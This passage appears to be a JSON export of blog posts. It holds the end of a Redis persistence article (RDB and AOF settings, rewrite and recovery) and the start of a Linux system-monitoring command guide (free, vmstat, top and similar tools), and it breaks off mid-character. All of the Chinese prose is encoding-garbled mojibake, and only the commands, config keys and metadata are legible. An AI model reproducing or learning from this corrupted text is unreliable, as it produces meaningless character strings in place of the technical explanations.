¼å¼ rdbchecksum yes &#x2F;&#x2F; å¯¹rdb æ–‡ä»¶è¿›è¡Œæ£€éªŒ è§¦å‘æœºåˆ¶Redis å½“è¾¾åˆ°ä»¥ä¸‹è§¦å‘æœºåˆ¶æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨åˆ›å»ºrdb æ–‡ä»¶ã€‚ å…¨é‡å¤åˆ¶ debug reload showdown RDB æ–‡ä»¶æ¢å¤å‰é¢å·²ç»æåˆ°è¿‡äº†ï¼ŒæŒä¹…åŒ–çš„ç›®çš„æ˜¯ä¸ºäº†è§£å†³å†…å­˜å¼‚å¸¸å¯¼è‡´çš„æ•°æ®ä¸¢å¤±é—®é¢˜ï¼Œå¦‚æœçœŸçš„é‡åˆ°äº†è¿™æ ·çš„æƒ…å†µï¼ŒRDB æ–‡ä»¶åˆæ˜¯å¦‚ä½•å®ç°æ•°æ®æ¢å¤çš„å‘¢ï¼Ÿ å› ä¸ºå¼€å¯æŒä¹…åŒ–ä¹‹åï¼Œæ•°æ®ä¼šå­˜å‚¨åˆ°åä¸º dump.rdb çš„æ–‡ä»¶ä¸­ï¼Œå½“ Redis æœåŠ¡å™¨é‡å¯æ—¶ï¼Œæ£€æµ‹åˆ° dump.rdb æ–‡ä»¶åï¼Œå°±ä¼šè‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ã€‚ AOFåœ¨æ­£å¼ä»‹ç»ä»€ä¹ˆæ˜¯AOF ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹RDB æ–¹å¼ç°å­˜çš„é—®é¢˜ã€‚ è€—æ—¶ã€è€—æ€§èƒ½ ä¸å¯æ§ã€ä¸¢å¤±æ•°æ® ä»€ä¹ˆæ˜¯AOFï¼Ÿä¸RDB ä¸åŒçš„æ˜¯ï¼Œå®ƒæ˜¯é€šè¿‡ä¿å­˜æ‰€æ‰§è¡Œçš„å†™å‘½ä»¤æ¥å®ç°çš„ï¼Œå¹¶ä¸”ä¿å­˜çš„æ•°æ®æ ¼å¼æ˜¯å®¢æˆ·ç«¯å‘é€çš„å‘½ä»¤ã€‚ ä¸‰ç§ç­–ç•¥Redis åœ¨æ‰§è¡Œå†™å‘½ä»¤æ—¶ï¼Œé¦–å…ˆå†™å…¥ç¡¬ç›˜çš„ç¼“å†²åŒºï¼Œç¼“å†²åŒºä¼šæ ¹æ®ä»¥ä¸‹ä¸‰ç§ç­–ç•¥å»åˆ·æ–°åˆ°ç£ç›˜ä¸­ã€‚ alwaysï¼šæ¯æ¬¡å†™å…¥éƒ½æŠŠç¼“å†²åŒº fsync åˆ°ç¡¬ç›˜ï¼Œæ€§èƒ½å½±å“æœ€å¤§ï¼Œå ç”¨ç£ç›˜ IO è¾ƒé«˜ï¼Œæ•°æ®å®‰å…¨æ€§æœ€é«˜ã€‚ everysecï¼šæ¯ç§’æŠŠç¼“å†²åŒº fsync åˆ°ç¡¬ç›˜ï¼Œå¯¹æ€§èƒ½å½±å“ç›¸å¯¹è¾ƒå°ã€‚ noï¼šç”±ç³»ç»Ÿå†³å®šæ˜¯å¦ fsyncã€‚ always è¿˜æ˜¯ everysec è¿˜æ˜¯ noï¼Ÿ å‘½ä»¤ always everysec no ä¼˜ç‚¹ ä¸ä¸¢å¤±æ•°æ® æ¯ç§’ä¸€æ¬¡ fsync ä¸ç”¨ç®¡ ç¼ºç‚¹ IO å¼€é”€è¾ƒå¤§ï¼Œä¸€èˆ¬çš„sata ç›˜åªæœ‰å‡ ç™¾ TPS ä¸¢ä¸€ç§’æ•°æ® ä¸å¯æ§ AOF é‡å†™æ¥çœ‹è¿™æ ·ä¸€ç§æƒ…å†µï¼š 12345678910127.0.0.1:6379&gt; set name php OK127.0.0.1:6379&gt; set name cOK127.0.0.1:6379&gt; set name pythonOK127.0.0.1:6379&gt; set name jsOK127.0.0.1:6379&gt; get name &quot;js&quot; è™½ç„¶set äº†å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯name çš„å€¼ï¼Œåªå—æœ€åä¸€æ¬¡set çš„å½±å“ï¼Œæ‰€ä»¥å‰é¢é‚£ä¹ˆå¤šæ¬¡ï¼Œå…¶å®æ²¡æœ‰å¿…è¦ä¹Ÿä¿å­˜åˆ°AOF æ–‡ä»¶ä¸­ã€‚ æ»¡è¶³æ‰€è®¾ç½®çš„æ¡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ AOF é‡å†™ï¼Œæ­¤æ—¶ Redis ä¼šæ‰«ææ•´ä¸ªå®ä¾‹çš„æ•°æ®ï¼Œé‡æ–°ç”Ÿæˆä¸€ä¸ª AOF æ–‡ä»¶æ¥è¾¾åˆ°ç˜¦èº«çš„æ•ˆæœã€‚ é…ç½®12345678910&#x2F;&#x2F; AOFappendonly yes &#x2F;&#x2F; å¼€å¯AOF ç­–ç•¥appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot; &#x2F;&#x2F; aof æ–‡ä»¶åappendfsync everysec &#x2F;&#x2F; åˆ·æ–°ç­–ç•¥dir &#x2F;big_disk_path &#x2F;&#x2F; å·¥ä½œç›®å½•no-appendfsync-on-write yes &#x2F;&#x2F; AOF é‡å†™æ—¶ï¼Œæ˜¯å¦éœ€è¦åšAOF æ£€æµ‹æ“ä½œ&#x2F;&#x2F; AOF é‡å†™auto-aof-rewrite-percentage 100 &#x2F;&#x2F; AOF æ–‡ä»¶è·ç¦»ä¸Šæ¬¡æ–‡ä»¶å¢é•¿è¶…è¿‡å¤šå°‘ç™¾åˆ†æ¯”auto-aof-rewrite-min-size 64mb &#x2F;&#x2F; AOF æ–‡ä»¶ä½“ç§¯æœ€å°å¤šå¤§ä»¥ä¸Šè§¦å‘ AOF æ–‡ä»¶æ¢å¤ä¸ RBD æ–‡ä»¶ä¸åŒï¼Œå› ä¸ºAOF æ–‡ä»¶çš„æ•°æ®æ ¼å¼ï¼Œæ˜¯ç”±å‘½ä»¤ç»„æˆçš„ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ç›´æ¥æ‰§è¡Œæ¯æ¡å‘½ä»¤å°±å¯ä»¥å°†æ•°æ®è¿›è¡Œæ¢å¤ã€‚ RDB è¿˜æ˜¯AOFï¼Ÿ RDB å’ŒAOF æœ‰å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œé‚£ä¹ˆåˆ°åº•è¯¥é€‰æ‹©å“ªä¸ªå‘¢ï¼Ÿ å¹¶æ²¡æœ‰ç»å¯¹æ­£ç¡®çš„ç­”æ¡ˆã€‚éœ€è¦æ ¹æ®å®é™…æƒ…å†µå»ä½œå–èˆï¼Œä¸è¿‡é€šå¸¸éƒ½æ˜¯ä½¿ç”¨æ··åˆæŒä¹…åŒ–çš„æ–¹å¼ã€‚ å‘½ä»¤ RDB AOF å¯åŠ¨ä¼˜å…ˆçº§ ä½ é«˜ ä½“ç§¯ å° å¤§ æ¢å¤é€Ÿåº¦ å¿« æ…¢ æ•°æ®å®‰å…¨æ€§ ä¸¢æ•°æ® æ ¹æ®ç­–ç•¥å†³å®š çº§åˆ« é‡ è½» æ··åˆæŒä¹…åŒ–æ··åˆæŒä¹…åŒ–æ˜¯é€šè¿‡ aof-use-rdb-preamble å‚æ•°æ¥å¼€å¯çš„ã€‚å®ƒçš„æ“ä½œæ–¹å¼æ˜¯è¿™æ ·çš„ï¼Œåœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚è¿™æ ·æ—¢èƒ½ä¿è¯æ•°æ®æ¢å¤æ—¶çš„é€Ÿåº¦ï¼ŒåŒæ—¶åˆèƒ½å‡å°‘æ•°æ®ä¸¢å¤±çš„é£é™©ã€‚ é‚£ä¹ˆæ··åˆæŒä¹…åŒ–ä¸­æ˜¯å¦‚ä½•æ¥è¿›è¡Œæ•°æ®æ¢å¤çš„å‘¢ï¼Ÿåœ¨ Redis é‡å¯æ—¶ï¼Œå…ˆåŠ è½½ RDB çš„å†…å®¹ï¼Œç„¶åå†é‡æ”¾å¢é‡ AOF æ ¼å¼å‘½ä»¤ã€‚è¿™æ ·å°±é¿å…äº† AOF æŒä¹…åŒ–æ—¶çš„å…¨é‡åŠ è½½ï¼Œä»è€Œä½¿åŠ è½½é€Ÿç‡å¾—åˆ°å¤§å¹…æå‡ã€‚ æ€»ç»“RDBæŒä¹…åŒ– å°†æŸä¸€æ—¶åˆ»çš„æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥åˆ°ç£ç›˜é‡Œï¼ŒæœåŠ¡é‡å¯æ—¶æ£€æµ‹åˆ°å¯¹åº”æ–‡ä»¶è‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ã€‚ æœ‰æ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ä¸¤ç§æœºåˆ¶ã€‚ AOFæŒä¹…åŒ– ä»¥æ–‡ä»¶è¿½åŠ çš„æ–¹å¼å†™å…¥å®¢æˆ·ç«¯æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚ æ•°æ®æ¢å¤æ—¶ï¼Œé€šè¿‡åˆ›å»ºä¼ªå®¢æˆ·ç«¯çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œç›´åˆ°æ¢å¤å®Œæˆã€‚ æ··åˆæŒä¹…åŒ– åœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ å‚è€ƒé“¾æ¥ è€åŠå¤©ï¼Œç»ˆäºæŠŠ redis æŒä¹…åŒ–ææ‡‚äº†","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"æŒä¹…åŒ–","slug":"æŒä¹…åŒ–","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"}]},{"title":"Linuxç³»ç»Ÿç›‘æ§å‘½ä»¤æ•´ç†æ±‡æ€»","slug":"summary-of-linux-system-monitoring-commands","date":"2020-11-17T14:55:16.000Z","updated":"2020-11-19T15:03:30.404Z","comments":true,"path":"summary-of-linux-system-monitoring-commands/","link":"","permalink":"https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/","excerpt":"ä»¥ä¸‹å‘½ä»¤ä»¥Ubuntu 18.04 LTS ç³»ç»Ÿä¸ºå‡†ã€‚","text":"ä»¥ä¸‹å‘½ä»¤ä»¥Ubuntu 18.04 LTS ç³»ç»Ÿä¸ºå‡†ã€‚ å‘½ä»¤ åŠŸèƒ½ å®ä¾‹ free æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬ç‰©ç†å†…å­˜å’Œè™šæ‹Ÿå†…å­˜ free -h æˆ– free -m vmstat å¯¹ç³»ç»Ÿçš„æ•´ä½“æƒ…å†µè¿›è¡Œç»Ÿè®¡ï¼ŒåŒ…æ‹¬å†…æ ¸è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€ç£ç›˜ã€é™·é˜±å’Œ CPU æ´»åŠ¨çš„ç»Ÿè®¡ä¿¡æ¯ vmstat 2 100 top å®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨çŠ¶å†µåŠæ€»ä½“çŠ¶å†µ top mpstat å®æ—¶ç³»ç»Ÿç›‘æ§å·¥å…·ï¼Œå®ƒä¼šæŠ¥å‘Šä¸CPUç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯ mpstat sar æ”¶é›†ã€æŠ¥å‘Šå’Œä¿å­˜CPUã€å†…å­˜ã€è¾“å…¥è¾“å‡ºç«¯å£ä½¿ç”¨æƒ…å†µ sar -n DEV 3 100 netstat æ£€éªŒæœ¬æœºå„ç«¯å£çš„ç½‘ç»œè¿æ¥æƒ…å†µï¼Œç”¨äºæ˜¾ç¤ºä¸IPã€TCPã€UDPå’ŒICMPåè®®ç›¸å…³çš„ç»Ÿè®¡æ•°æ® netstat -a tcpdump ç”¨äºæ•æ‰æˆ–è€…è¿‡æ»¤ç½‘ç»œä¸ŠæŒ‡å®šæ¥å£ä¸Šæ¥æ”¶æˆ–è€…ä¼ è¾“çš„TCP/IPåŒ… tcpdump -i eth0 -c 3 iptraf ç”¨æ¥ç”ŸæˆåŒ…æ‹¬TCPä¿¡æ¯ã€UDPè®¡æ•°ã€ICMPå’ŒOSPFä¿¡æ¯ã€ä»¥å¤ªç½‘è´Ÿè½½ä¿¡æ¯ã€èŠ‚ç‚¹çŠ¶æ€ä¿¡æ¯ã€IPæ ¡éªŒå’Œé”™è¯¯ç­‰ç­‰ç»Ÿè®¡æ•°æ® iptraf iostat æ”¶é›†æ˜¾ç¤ºç³»ç»Ÿå­˜å‚¨è®¾å¤‡è¾“å…¥å’Œè¾“å‡ºçŠ¶æ€ç»Ÿè®¡ iostat -x -k 2 100 lsof æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶çš„å·¥å…·ï¼ŒæŸ¥çœ‹ç›‘å¬ç«¯å£ lsof -i :3000 atop æ˜¾ç¤ºçš„æ˜¯å„ç§ç³»ç»Ÿèµ„æºï¼ˆCPU, memory, network, I/O, kernelï¼‰çš„ç»¼åˆï¼Œå¹¶ä¸”åœ¨é«˜è´Ÿè½½çš„æƒ…å†µä¸‹è¿›è¡Œäº†å½©è‰²æ ‡æ³¨ atop htop å®ƒå’Œtopå‘½ä»¤ååˆ†ç›¸ä¼¼ï¼Œé«˜çº§çš„äº¤äº’å¼çš„å®æ—¶linuxè¿›ç¨‹ç›‘æ§å·¥å…· htop ps æœ€åŸºæœ¬åŒæ—¶ä¹Ÿæ˜¯éå¸¸å¼ºå¤§çš„è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤ ps aux glances ç›‘è§† CPUï¼Œå¹³å‡è´Ÿè½½ï¼Œå†…å­˜ï¼Œç½‘ç»œæµé‡ï¼Œç£ç›˜ I/Oï¼Œå…¶ä»–å¤„ç†å™¨ å’Œ æ–‡ä»¶ç³»ç»Ÿ ç©ºé—´çš„åˆ©ç”¨æƒ…å†µ glances dstat å…¨èƒ½ç³»ç»Ÿä¿¡æ¯ç»Ÿè®¡å·¥å…·ï¼Œå¯ç”¨äºæ›¿æ¢vmstatã€iostatã€netstatã€nfsstatå’Œifstatè¿™äº›å‘½ä»¤çš„å·¥å…· dstat uptime ç”¨äºæŸ¥çœ‹æœåŠ¡å™¨è¿è¡Œäº†å¤šé•¿æ—¶é—´ä»¥åŠæœ‰å¤šå°‘ä¸ªç”¨æˆ·ç™»å½•ï¼Œå¿«é€Ÿè·çŸ¥æœåŠ¡å™¨çš„è´Ÿè·æƒ…å†µ uptime dmesg ä¸»è¦ç”¨æ¥æ˜¾ç¤ºå†…æ ¸ä¿¡æ¯ã€‚ä½¿ç”¨dmesgå¯ä»¥æœ‰æ•ˆè¯Šæ–­æœºå™¨ç¡¬ä»¶æ•…éšœæˆ–è€…æ·»åŠ ç¡¬ä»¶å‡ºç°çš„é—®é¢˜ dmesg mpstat ç”¨äºæŠ¥å‘Šå¤šè·¯CPUä¸»æœºçš„æ¯é¢—CPUæ´»åŠ¨æƒ…å†µï¼Œä»¥åŠæ•´ä¸ªä¸»æœºçš„CPUæƒ…å†µ mpstat 2 3 nmon ç›‘æ§CPUã€å†…å­˜ã€I/Oã€æ–‡ä»¶ç³»ç»ŸåŠç½‘ç»œèµ„æºã€‚å¯¹äºå†…å­˜çš„ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å®æ—¶çš„æ˜¾ç¤º æ€»/å‰©ä½™å†…å­˜ã€äº¤æ¢ç©ºé—´ç­‰ä¿¡æ¯ nmon mytop ç”¨äºç›‘æ§ mysql çš„çº¿ç¨‹å’Œæ€§èƒ½ã€‚å®ƒèƒ½è®©ä½ å®æ—¶æŸ¥çœ‹æ•°æ®åº“ä»¥åŠæ­£åœ¨å¤„ç†å“ªäº›æŸ¥è¯¢ mytop iftop ç”¨æ¥ç›‘æ§ç½‘å¡çš„å®æ—¶æµé‡ï¼ˆå¯ä»¥æŒ‡å®šç½‘æ®µï¼‰ã€åå‘è§£æIPã€æ˜¾ç¤ºç«¯å£ä¿¡æ¯ç­‰ iftop jnettop ä»¥ç›¸åŒçš„æ–¹å¼æ¥ç›‘æµ‹ç½‘ç»œæµé‡ä½†æ¯” iftop æ›´å½¢è±¡ã€‚å®ƒè¿˜æ”¯æŒè‡ªå®šä¹‰çš„æ–‡æœ¬è¾“å‡ºï¼Œå¹¶èƒ½ä»¥å‹å¥½çš„äº¤äº’æ–¹å¼æ¥æ·±åº¦åˆ†ææ—¥å¿— jnettop ngrep ç½‘ç»œå±‚çš„ grepã€‚å®ƒä½¿ç”¨ pcap ï¼Œå…è®¸é€šè¿‡æŒ‡å®šæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼æˆ–åå…­è¿›åˆ¶è¡¨è¾¾å¼æ¥åŒ¹é…æ•°æ®åŒ… ngrep nmap å¯ä»¥æ‰«æä½ æœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£å¹¶ä¸”å¯ä»¥æ£€æµ‹æ­£åœ¨ä½¿ç”¨å“ªä¸ªæ“ä½œç³»ç»Ÿ nmap localhost du æŸ¥çœ‹Linuxç³»ç»Ÿä¸­æŸç›®å½•çš„å¤§å° du -sh * fdisk æŸ¥çœ‹ç¡¬ç›˜åŠåˆ†åŒºä¿¡æ¯ fdisk -l å†…å­˜ç›‘æ§freefreeå‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæœªä½¿ç”¨çš„å’Œå·²ä½¿ç”¨çš„å†…å­˜æ•°ç›®ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºè¢«å†…æ ¸ä½¿ç”¨çš„å†…å­˜ç¼“å†²åŒºã€‚ è¯­æ³• 1free (é€‰é¡¹) å¸¸ç”¨é€‰é¡¹ï¼š-bï¼šä»¥Byteä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-kï¼šä»¥KBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-mï¼šä»¥MBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-gï¼šä»¥GBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ;-oï¼šä¸æ˜¾ç¤ºç¼“å†²åŒºè°ƒèŠ‚åˆ—ï¼›-tï¼šæ˜¾ç¤ºå†…å­˜æ€»å’Œåˆ—ï¼›-Vï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å­—æ®µè¯´æ˜ï¼š totalï¼šå†…å­˜æ€»æ•°ï¼› usedï¼šå·²ç»ä½¿ç”¨çš„å†…å­˜æ•°ï¼ŒåŒ…æ‹¬ cached å’Œåº”ç”¨ç¨‹åºå®é™…ä½¿ç”¨çš„å†…å­˜ï¼› freeï¼šç©ºé—²çš„å†…å­˜æ•°ï¼› sharedï¼šå½“å‰å·²ç»åºŸå¼ƒä¸ç”¨ï¼› buffersï¼šç¼“å­˜å†…å­˜æ•°ï¼› cachedï¼šç¼“å­˜å†…å­˜æ•°ã€‚ å…³ç³»ï¼štotal = used + free vmstatvmstatå‘½ä»¤ çš„å«ä¹‰ä¸ºæ˜¾ç¤ºè™šæ‹Ÿå†…å­˜çŠ¶æ€ï¼ˆâ€œViryual Memor Staticsâ€ï¼‰ï¼Œä½†æ˜¯å®ƒå¯ä»¥æŠ¥å‘Šå…³äºè¿›ç¨‹ã€å†…å­˜ã€I/Oç­‰ç³»ç»Ÿæ•´ä½“è¿è¡ŒçŠ¶æ€ã€‚ è¯­æ³• 1vmstat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹-aï¼šæ˜¾ç¤ºæ´»åŠ¨å†…é¡µï¼›-fï¼šæ˜¾ç¤ºå¯åŠ¨ååˆ›å»ºçš„è¿›ç¨‹æ€»æ•°ï¼›-mï¼šæ˜¾ç¤ºslabä¿¡æ¯ï¼›-nï¼šå¤´ä¿¡æ¯ä»…æ˜¾ç¤ºä¸€æ¬¡ï¼›-sï¼šä»¥è¡¨æ ¼æ–¹å¼æ˜¾ç¤ºäº‹ä»¶è®¡æ•°å™¨å’Œå†…å­˜çŠ¶æ€ï¼›-dï¼šæŠ¥å‘Šç£ç›˜çŠ¶æ€ï¼›-pï¼šæ˜¾ç¤ºæŒ‡å®šçš„ç¡¬ç›˜åˆ†åŒºçŠ¶æ€ï¼›-Sï¼šè¾“å‡ºä¿¡æ¯çš„å•ä½ã€‚ å‚æ•° äº‹ä»¶é—´éš”ï¼šçŠ¶æ€ä¿¡æ¯åˆ·æ–°çš„æ—¶é—´é—´éš”ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼šProcsï¼ˆè¿›ç¨‹ï¼‰ r: è¿è¡Œå’Œç­‰å¾…CPUæ—¶é—´ç‰‡çš„è¿›ç¨‹æ•°ï¼Œè¿™ä¸ªå€¼å¦‚æœé•¿æœŸå¤§äºç³»ç»ŸCPUä¸ªæ•°ï¼Œå°±è¯´æ˜CPUèµ„æºä¸è¶³ï¼Œå¯ä»¥è€ƒè™‘å¢åŠ CPU b: ç­‰å¾…èµ„æºçš„è¿›ç¨‹æ•°ï¼Œæ¯”å¦‚æ­£åœ¨ç­‰å¾…I/Oæˆ–è€…å†…å­˜äº¤æ¢ç­‰ Memoryï¼ˆå†…å­˜ï¼‰ swpd: ä½¿ç”¨è™šæ‹Ÿå†…å­˜å¤§å°ï¼Œå¦‚æœswpdçš„å€¼ä¸ä¸º0ï¼Œä½†æ˜¯SIï¼ŒSOçš„å€¼é•¿æœŸä¸º0ï¼Œè¿™ç§æƒ…å†µä¸ä¼šå½±å“ç³»ç»Ÿæ€§èƒ½ã€‚ free: ç©ºé—²ç‰©ç†å†…å­˜å¤§å°ï¼ˆä»¥KBä¸ºå•ä½ï¼‰ã€‚ buff: ç”¨ä½œç¼“å†²çš„å†…å­˜å¤§å°ã€‚ cache: ç”¨ä½œç¼“å­˜çš„å†…å­˜å¤§å°ï¼Œå¦‚æœcacheçš„å€¼å¤§çš„æ—¶å€™ï¼Œè¯´æ˜cacheå¤„çš„æ–‡ä»¶æ•°å¤šã€‚å¦‚æœæ­¤æ—¶IOä¸­çš„biæ¯”è¾ƒå°ï¼Œå°±è¯´æ˜æ–‡ä»¶ç³»ç»Ÿæ•ˆç‡æ¯”è¾ƒå¥½ã€‚ Swap si: æ¯ç§’ä»äº¤æ¢åŒºå†™åˆ°å†…å­˜çš„å¤§å°ï¼Œç”±ç£ç›˜è°ƒå…¥å†…å­˜ã€‚ so: æ¯ç§’å†™å…¥äº¤æ¢åŒºçš„å†…å­˜å¤§å°ï¼Œç”±å†…å­˜è°ƒå…¥ç£ç›˜ã€‚ æ³¨æ„ï¼šå†…å­˜å¤Ÿç”¨çš„æ—¶å€™ï¼Œè¿™2ä¸ªå€¼éƒ½æ˜¯0ï¼Œå¦‚æœè¿™2ä¸ªå€¼é•¿æœŸå¤§äº0æ—¶ï¼Œç³»ç»Ÿæ€§èƒ½ä¼šå—åˆ°å½±å“ï¼Œç£ç›˜IOå’ŒCPUèµ„æºéƒ½ä¼šè¢«æ¶ˆè€—ã€‚æœ‰äº›æœ‹å‹çœ‹åˆ°ç©ºé—²å†…å­˜ï¼ˆfreeï¼‰å¾ˆå°‘çš„æˆ–æ¥è¿‘äº0æ—¶ï¼Œå°±è®¤ä¸ºå†…å­˜ä¸å¤Ÿç”¨äº†ï¼Œä¸èƒ½å…‰çœ‹è¿™ä¸€ç‚¹ï¼Œè¿˜è¦ç»“åˆsiå’Œsoï¼Œå¦‚æœfreeå¾ˆå°‘ï¼Œä½†æ˜¯siå’Œsoä¹Ÿå¾ˆå°‘ï¼ˆå¤§å¤šæ—¶å€™æ˜¯0ï¼‰ï¼Œé‚£ä¹ˆä¸ç”¨æ‹…å¿ƒï¼Œç³»ç»Ÿæ€§èƒ½è¿™æ—¶ä¸ä¼šå—åˆ°å½±å“çš„ã€‚ IOï¼ˆç°åœ¨çš„Linuxç‰ˆæœ¬å—çš„å¤§å°ä¸º1kbï¼‰ bi: æ¯ç§’è¯»å–çš„å—æ•° bo: æ¯ç§’å†™å…¥çš„å—æ•° æ³¨æ„ï¼šéšæœºç£ç›˜è¯»å†™çš„æ—¶å€™ï¼Œè¿™2ä¸ªå€¼è¾ƒå¤§ï¼ˆå¦‚è¶…å‡º1024k)ï¼Œè€Œä¸”waå€¼æ¯”è¾ƒå¤§ï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿç£ç›˜IOæ€§èƒ½ç“¶é¢ˆã€‚ systemï¼ˆç³»ç»Ÿï¼‰ in: æ¯ç§’ä¸­æ–­æ•°ï¼ŒåŒ…æ‹¬æ—¶é’Ÿä¸­æ–­ã€‚ cs: æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢æ•°ã€‚ æ³¨æ„ï¼šä¸Šé¢2ä¸ªå€¼è¶Šå¤§ï¼Œä¼šçœ‹åˆ°ç”±å†…æ ¸æ¶ˆè€—çš„CPUæ—¶é—´ä¼šè¶Šå¤§ã€‚ CPUï¼ˆä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºï¼‰us: ç”¨æˆ·è¿›ç¨‹æ‰§è¡Œæ—¶é—´ç™¾åˆ†æ¯”(user time)usçš„å€¼æ¯”è¾ƒé«˜æ—¶ï¼Œè¯´æ˜ç”¨æˆ·è¿›ç¨‹æ¶ˆè€—çš„CPUæ—¶é—´å¤šï¼Œä½†æ˜¯å¦‚æœé•¿æœŸè¶…50%çš„ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯¥è€ƒè™‘ä¼˜åŒ–ç¨‹åºç®—æ³•æˆ–è€…è¿›è¡ŒåŠ é€Ÿã€‚ sy: å†…æ ¸ç³»ç»Ÿè¿›ç¨‹æ‰§è¡Œæ—¶é—´ç™¾åˆ†æ¯”(system time)syçš„å€¼é«˜æ—¶ï¼Œè¯´æ˜ç³»ç»Ÿå†…æ ¸æ¶ˆè€—çš„CPUèµ„æºå¤šï¼Œè¿™å¹¶ä¸æ˜¯è‰¯æ€§è¡¨ç°ï¼Œæˆ‘ä»¬åº”è¯¥æ£€æŸ¥åŸå› ã€‚ id: ç©ºé—²æ—¶é—´ç™¾åˆ†æ¯” wa: IOç­‰å¾…æ—¶é—´ç™¾åˆ†æ¯”waçš„å€¼é«˜æ—¶ï¼Œè¯´æ˜IOç­‰å¾…æ¯”è¾ƒä¸¥é‡ï¼Œè¿™å¯èƒ½ç”±äºç£ç›˜å¤§é‡ä½œéšæœºè®¿é—®é€ æˆï¼Œä¹Ÿæœ‰å¯èƒ½ç£ç›˜å‡ºç°ç“¶é¢ˆï¼ˆå—æ“ä½œï¼‰ã€‚ stï¼šä¸€èˆ¬ä¸å…³æ³¨ï¼Œè™šæ‹Ÿæœºå ç”¨çš„æ—¶é—´ç™¾åˆ†æ¯”ã€‚ CPU ç›‘æ§toptopå‘½ä»¤ å¯ä»¥å®æ—¶åŠ¨æ€åœ°æŸ¥çœ‹ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæƒ…å†µã€‚ è¯­æ³•ï¼š 1top (é€‰é¡¹) é€‰é¡¹ï¼š-bï¼šä»¥æ‰¹å¤„ç†æ¨¡å¼æ“ä½œï¼›-cï¼šæ˜¾ç¤ºå®Œæ•´çš„æ²»å‘½ä»¤ï¼›-dï¼šå±å¹•åˆ·æ–°é—´éš”æ—¶é—´ï¼›-Iï¼šå¿½ç•¥å¤±æ•ˆè¿‡ç¨‹ï¼›-sï¼šä¿å¯†æ¨¡å¼ï¼›-Sï¼šç´¯ç§¯æ¨¡å¼ï¼›-i&lt;æ—¶é—´&gt;ï¼šè®¾ç½®é—´éš”æ—¶é—´ï¼›-u&lt;ç”¨æˆ·å&gt;ï¼šæŒ‡å®šç”¨æˆ·åï¼›-p&lt;è¿›ç¨‹å·&gt;ï¼šæŒ‡å®šè¿›ç¨‹ï¼›-n&lt;æ¬¡æ•°&gt;ï¼šå¾ªç¯æ˜¾ç¤ºçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼š topï¼šç³»ç»Ÿå½“å‰æ—¶é—´ up xxx daysï¼šç³»ç»Ÿè¿è¡Œæ—¶é—´ 1 usersï¼šå½“å‰ç™»å½•ç”¨æˆ·ä¸ªæ•° load averageï¼šç³»ç»Ÿè´Ÿè½½ã€‚å³ä»»åŠ¡é˜Ÿåˆ—çš„å¹³å‡é•¿åº¦ã€‚ä¸‰ä¸ªæ•°å€¼åˆ†åˆ«ä¸ºæœ€è¿‘1åˆ†é’Ÿã€æœ€è¿‘5åˆ†é’Ÿã€æœ€è¿‘15åˆ†é’Ÿçš„å¹³å‡è´Ÿè½½ã€‚â€”â€”è¶…è¿‡Nï¼ˆCPUæ 